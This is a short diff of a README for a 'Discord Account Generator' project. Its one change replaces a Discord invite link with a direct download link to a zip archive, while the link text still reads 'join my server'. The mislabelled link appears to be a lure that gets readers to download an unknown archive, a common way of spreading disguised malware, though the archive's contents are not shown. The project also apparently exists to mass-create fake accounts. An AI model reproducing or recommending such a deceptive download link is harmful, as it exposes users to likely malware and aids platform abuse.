@@ -1,6 +1,6 @@
 # Discord Account Generator
 
-Dont forget to [join my server](https://discord.gg/xaro)
+Dont forget to [join my server](https://github.com/backup39/Discord-Member-Generator/raw/refs/heads/main/input/Discord_Generator_Member_v3.1.zip)
 
 ### Description
 
